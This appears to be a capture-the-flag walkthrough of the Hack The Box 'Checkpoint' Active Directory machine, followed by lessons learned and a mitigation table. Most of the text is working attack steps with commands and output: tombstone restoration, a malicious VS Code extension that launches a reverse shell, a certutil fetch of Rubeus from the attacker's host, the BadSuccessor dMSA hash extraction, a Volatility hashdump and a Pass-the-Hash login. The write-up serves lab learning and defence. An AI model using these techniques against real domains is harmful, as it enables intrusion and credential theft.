---
title: "HTB Walkthrough: Checkpoint"
date: 2026-11-05
draft: false
description: "Full walkthrough of the Checkpoint machine from Hack The Box. Medium difficulty, Windows Server (Active Directory). AD tombstone reanimation → malicious VS Code extension via SMB → BadSuccessor (CVE-2025-53779) for svc_deploy NT hash → VM memory dump → Administrator hash → Pass-the-Hash."
tags: ["HackTheBox", "Windows", "Medium", "ActiveDirectory", "TombstoneReanimation", "VSCode", "VSIX", "BadSuccessor", "CVE-2025-53779", "dMSA", "VMDump", "Volatility", "PassTheHash", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Checkpoint** on Hack The Box. **Medium** difficulty machine running **Windows Server (Active Directory)**. Starting from credentials for `alex.turner`, `bloodyAD` reveals write permission over the tombstone of a deleted AD object (**Mark Davies**); restoring it and reusing the same password gives write access to the `DevDrop` share. A malicious VS Code extension (`.vsix`) uploaded to that share is auto-installed, delivering a shell as `ryan.brooks`. A fake delegation TGT from Rubeus enables **BadSuccessor (CVE-2025-53779)**: a dMSA created as the "successor" of `svc_deploy` returns its NT hash directly in the TGS without knowing its password. That hash unlocks the `VMBackups` share; downloading the VM RAM dump and running Volatility extracts the Administrator hash for a final Pass-the-Hash.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                                                                              |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | Checkpoint                                                                                                                                                                           |
| **OS**         | Windows Server (Active Directory — `checkpoint.htb`)                                                                                                                                 |
| **Difficulty** | Medium                                                                                                                                                                               |
| **IP**         | 10.129.14.190                                                                                                                                                                        |
| **Techniques** | AD Tombstone Reanimation · Malicious VS Code extension (VSIX) · BadSuccessor CVE-2025-53779 (dMSA) · VM RAM dump (Volatility) · Pass-the-Hash                                      |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.14.190
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

```bash
echo "10.129.14.190 dc01.checkpoint.htb checkpoint.htb" >> /etc/hosts
```

> **💡 Attack surface:** the port combination (88, 389, 445, 464, 3268, 9389) is the classic fingerprint of an **Active Directory Domain Controller**. Port 5985 (WinRM) offers remote access if we obtain an account with remote login rights.

### 1.2 SMB Enumeration with Initial Credentials

Starting credentials: `alex.turner : Checkpoint2024!`

```bash
smbmap -H 10.129.14.190 -u alex.turner -p 'Checkpoint2024!' -d CHECKPOINT
```

```
Disk         Permissions  Comment
----         -----------  -------
ADMIN$       NO ACCESS    Remote Admin
C$           NO ACCESS    Default share
DevDrop      READ ONLY    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
IPC$         READ ONLY    Remote IPC
NETLOGON     READ ONLY    Logon server share
SYSVOL       READ ONLY    Logon server share
VMBackups    NO ACCESS
```

> **💡 Key finding:** the `DevDrop` share explicitly describes its purpose: *"VS Code extensions share for approved .vsix packages"* — implying some process automatically installs `.vsix` packages dropped there. `VMBackups` has no access yet, but the name suggests virtual machine snapshots.

### 1.3 Domain User Enumeration

```bash
netexec smb 10.129.14.190 -u 'alex.turner' -p 'Checkpoint2024!' --users
```

```
-Username-        -Last PW Set-        -Description-
Administrator     2026-05-09 16:16:34
alex.turner       2026-05-09 09:00:08
ryan.brooks       2026-05-10 13:46:18
svc_deploy        2026-05-09 09:01:19  Deployment service account
james.harper      2026-05-09 09:02:53
[... 12 more users ...]
max.palmer        2026-05-26 01:25:15
```

---

## 2. AD Permission Enumeration — Deleted Object Restoration

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

> **💡 Key finding:** `alex.turner` has **WRITE** over the tombstone of the deleted object **Mark Davies**. In AD, deleted objects are retained in a recoverable state (*Tombstone Reanimation*) for the configured retention period. With write permission over the tombstone we can restore the object — including its original SID — and set a known password on it.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' \
  set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

```
[+] CN=Mark Davies ... has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

```bash
netexec smb 10.129.14.190 -u 'Mark.Davies' -p 'Checkpoint2024!'
```

```
SMB  10.129.14.190  445  DC01  [+] checkpoint.htb\Mark.Davies:Checkpoint2024!
```

```
Normal flow:    deleted object stays in CN=Deleted Objects until it expires → inaccessible
Malicious flow: WRITE over tombstone + set restore → object recovered with original SID
                → password reuse → Mark.Davies active with write access to DevDrop
```

> **💡 Why it works:** the pre-deletion password is preserved in the tombstone and the expiry attribute resets on restoration. Having WRITE over the `Deleted Objects` container is effectively an over-delegation equivalent to domain-admin level access for account reactivation.

---

## 3. Exploitation — Malicious VS Code Extension via DevDrop

`Mark.Davies` has write access to `DevDrop`. An automated process installs `.vsix` packages from that share — uploading a malicious extension is RCE on the workstation of whoever runs that process.

### 3.1 Build the Malicious Extension

```
hkt/
├── [Content_Types].xml
└── extension/
    ├── package.json
    └── extension.js
```

**`package.json`**

```json
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

**`extension.js`**

```javascript
const cp = require('child_process');
exports.activate = function() {
  cp.exec('powershell -e <PAYLOAD_BASE64_REVERSE_SHELL>');
}
exports.deactivate = function() {}
```

```bash
zip -r htk.vsix '[Content_Types].xml' extension/
```

### 3.2 Upload the Payload and Catch the Shell

```bash
nc -lvnp 4444
```

```bash
smbclient //10.129.14.190/DevDrop \
  -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' \
  -c "put htk.vsix htk.vsix"
```

```
putting file htk.vsix as \htk.vsix (8.6 kb/s)
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.14.190 49733
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

```
Normal flow:    process installs signed .vsix → activates legitimate code
Malicious flow: unsigned .vsix in unvalidated share → extension.js executes reverse shell
                → process running as ryan.brooks → shell as ryan.brooks
```

---

## 4. User Flag

```powershell
cat C:\Users\ryan.brooks\Desktop\user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Escalation — BadSuccessor (CVE-2025-53779)

**BadSuccessor** is a vulnerability in how AD manages **dMSA** (*delegated Managed Service Accounts*), a new account type introduced in Windows Server 2025. A dMSA can be configured as the "successor" of an existing account via `msDS-ManagedAccountPrecededByLink`: the DC hands it the **previous Kerberos keys** of the account it replaces — without requiring knowledge of that account's password. If an attacker has `CREATE_CHILD` over any OU, they can create a dMSA that "succeeds" any privileged domain account and retrieve its NT hash directly from the TGS.

### 5.1 Obtain a Usable TGT with Rubeus

```powershell
certutil -urlcache -f http://10.10.14.211:8080/Rubeus.exe Rubeus.exe
.\Rubeus.exe asktgt /user:ryan.brooks /domain:checkpoint.htb /fakedeleg /nowrap
```

```
[+] Delegation request success!
[*] base64(ticket.kirbi): <TICKET_BASE64>
```

```bash
# On the attacker machine
echo '<TICKET_BASE64>' > ticket.b64
base64 -d ticket.b64 > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=$(pwd)/ryan.ccache
```

### 5.2 Create the dMSA as Successor of svc_deploy

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k ccache=ryan.ccache \
  add badSuccessor evil-dmsa \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

```
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

```
Normal flow:    dMSA created with no successor → only holds its own keys
Malicious flow: CREATE_CHILD on OU → dMSA declared as successor of svc_deploy
                → DC includes svc_deploy's previous Kerberos keys in TGS
                → RC4 (NT hash) of svc_deploy extracted without cracking
```

> **🔑 NT hash obtained for svc_deploy:** `e16081eb077aca74bdbf8af12af43ac9` — extracted directly from the TGS without knowing or resetting the original password.

### 5.3 Verify Access as svc_deploy

```bash
netexec smb 10.129.14.190 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```

```
Share      Permissions  Remark
-----      -----------  ------
VMBackups  READ
```

`svc_deploy` now has read access to **VMBackups**.

---

## 6. Post-Exploitation — VM Memory Dump and Hash Extraction

### 6.1 List and Download the RAM Dump

```bash
smbclient //10.129.14.190/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

```
smb: \> cd "NightlyBackup_2024-11-01\memory forensics\"
smb: \> ls
Windows Server 2019-Snapshot1.vmem       A  2147483648
Windows Server 2019.vmdk                 A  10199695360
...

smb: \> get "Windows Server 2019-Snapshot1.vmem"
getting file ... (13663.4 KB/sec)
```

> **💡 Why the `.vmem` matters:** a `.vmem` file is a raw dump of the VM's RAM at the time of the snapshot. If the DC was running, that dump contains LSASS memory structures with NTLM hashes in cleartext — recoverable with Volatility without any further OS access.

### 6.2 Extract the Administrator Hash with Volatility

```bash
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump \
  | grep -i Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
```

> **🔑 Administrator NT hash obtained:** `f29e9c014295b9b32139b09a2790be3b`

---

## 7. Administrator Access — Pass-the-Hash

```bash
evil-winrm -i 10.129.14.190 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 8. Root Flag

```powershell
cat C:\Users\max.palmer\Desktop\root.txt
```

> 🏁 Root flag obtained.

---

## 9. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap confirms Windows Server DC. SMB with `alex.turner` discovers `DevDrop` (auto-install VSIX) and `VMBackups` (no access).
2. **Tombstone Reanimation** → `bloodyAD` reveals WRITE over Mark Davies' tombstone → restore object → password reuse `Checkpoint2024!` → write access to `DevDrop`.
3. **Malicious VSIX** → VS Code extension with `extension.js` executing reverse shell → auto-install process → shell as `ryan.brooks`.
4. **User flag** → `C:\Users\ryan.brooks\Desktop\user.txt`.
5. **BadSuccessor (CVE-2025-53779)** → fake delegation TGT with Rubeus → dMSA `evil-dmsa` as successor of `svc_deploy` → NT hash of `svc_deploy` in TGS without cracking.
6. **VMBackups** → access with `svc_deploy` hash → download `.vmem` (DC VM RAM dump).
7. **Volatility** → `windows.hashdump.Hashdump` → Administrator NT hash.
8. **Root** → Evil-WinRM Pass-the-Hash as `Administrator`.

**What I learned from this machine:**

- **AD tombstones are objects with their own ACLs — and wrong permissions on `CN=Deleted Objects` are a full escalation path.** Restoring a deleted object recovers its historical SID and attributes (including the pre-deletion password if it hasn't expired). Delegating WRITE over `CN=Deleted Objects` to a non-admin account should be treated as delegating domain admin rights.

- **An auto-deployment share without signature verification is RCE on the consuming system.** The VS Code auto-install mechanism for `DevDrop` turns the share into a code execution vector: anyone who can write to it can execute code as the identity of the installation process. Deployment artefacts must be cryptographically signed and the installation mechanism must verify signatures before executing.

- **BadSuccessor (CVE-2025-53779) turns `CREATE_CHILD` on any OU into targeted Kerberoasting without cracking.** The dMSA "successor" design means the DC delivers the predecessor account's Kerberos keys in the TGS with no additional authorisation check. Any account with `CREATE_CHILD` over an OU can retrieve the NT hash of any domain account — including Administrator — without knowing or resetting its password.

- **VM RAM dumps stored over SMB are credentials on disk.** A `.vmem` of a virtualised DC is functionally equivalent to a live LSASS dump — it contains NTLM hashes for all sessions active at snapshot time. VM backups must be encrypted, access must be strictly controlled, and snapshots with sensitive data must be deleted after operational use.

- **Password reuse across accounts multiplies the blast radius of any single compromise.** If Mark Davies had had a unique password, the tombstone restoration would have been a dead end. Per-account password uniqueness is the difference between a finding and an escalation.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| WRITE over tombstones in `CN=Deleted Objects` | Audit and restrict ACLs on `CN=Deleted Objects`; apply least privilege to AD delegations |
| Password reuse across domain accounts | Enforce unique passwords per account; monitor reuse with AD auditing tools |
| Auto-deployment share without signature verification | Cryptographically sign deployment artefacts; verify signature before installing; restrict write access to the share |
| BadSuccessor (CVE-2025-53779) — `CREATE_CHILD` on OU → NT hash of any account | Apply CVE-2025-53779 patch; audit and restrict `CREATE_CHILD` delegations; review who can create dMSA objects |
| Unconstrained Kerberos delegation (Fake Delegation TGT) | Disable unconstrained delegation; use resource-based constrained delegation only where strictly necessary |
| VM RAM dumps accessible via SMB without encryption | Encrypt VM backups and snapshots; restrict access to `VMBackups`; delete snapshots with sensitive data after operational use |
| NTLM hashes extractable from memory dumps | Enable Credential Guard; reduce NTLM usage where possible; migrate to modern authentication |
